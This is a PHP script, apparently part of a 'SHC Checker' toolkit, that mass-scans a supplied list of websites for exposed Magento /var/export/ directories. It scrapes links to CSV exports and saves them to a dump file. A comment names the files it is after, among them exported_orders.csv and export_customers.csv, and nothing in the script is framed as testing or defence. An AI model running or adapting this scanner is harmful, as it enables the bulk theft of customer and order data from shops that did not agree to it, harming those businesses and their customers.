<?php
/**
 * @Author: shor7cut
 * @Date:   2017-01-30 14:01:48
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2017-09-13 02:33:10
 */
require_once('shc.modules.php');
$shc = new Modules_Checker;
function result($content, $url, $ch, $email){
	$shc = new Modules_Checker;
	echo "[Magento Grab] ".str_replace('/var/export/', '', $url)." => ";
	preg_match_all('/a href="(.*?).csv"/', $content, $matches);
	if( count($matches[1]) != 0){
		echo "Woot ~".count($matches[1])."~ \r\n";
		$x = fopen("dump-site.txt", "a+");
		foreach ($matches[0] as $key => $dumpURL) {
			//$dumpURLx = $dumpURL;
			$dumpURL = str_replace('a href=', '', str_replace('"', '', $dumpURL));
			
			fwrite($x, $url.$dumpURL."\r\n");
		}
		fclose($x);
	}else{
		/*

	
	/var/export/export_all_products.csv
	/var/export/export_all_products_occ.csv
	/var/export/export_all_products_seashepherd.csv
	/var/export/export_all_products_tws.csv
	/var/export/export_product.csv
	/var/export/export_product_occ.csv
	/var/export/export_product_stocks.csv
	/var/export/exported_orders.csv
	/var/export/export_customers.csv



		*/
		echo "None\r\n";
	}
}                                                                                           
echo "  _____ _____ _____ _           _            \r\n";  
echo " |   __|  |  |     | |_ ___ ___| |_ ___ ___  SHOR7CUT \r\n"; 
echo " |__   |     |   --|   | -_|  _| '_| -_|  _| \r\n"; 
echo " |_____|__|__|_____|_|_|___|___|_,_|___|_|   \r\n"; 
echo "\r\n";
$file       = $shc->readline("File List Email/Empass : ");
$file       = file_get_contents($file);
$file       = explode("\r\n", $file); // windows (\r\n) linux (\n)
$files      = array_unique($file);
$count      = count($file);

echo "[SHC CHECKER] Tunggu sembentar ...\r\n";
foreach ($files as $number => $email) {

	if(!empty($email)){

		if(!preg_match("/^http:\/\//", $email) AND !preg_match("/^https:\/\//", $email)) {
	        $email = "http://".$email;
	    } else {
	        $email = $email;
	    }
	    if(strlen($email) > 11){
	    	$shc->startRequest($email."/var/export/", 'result', $email , '' , false);
	    }
	}

}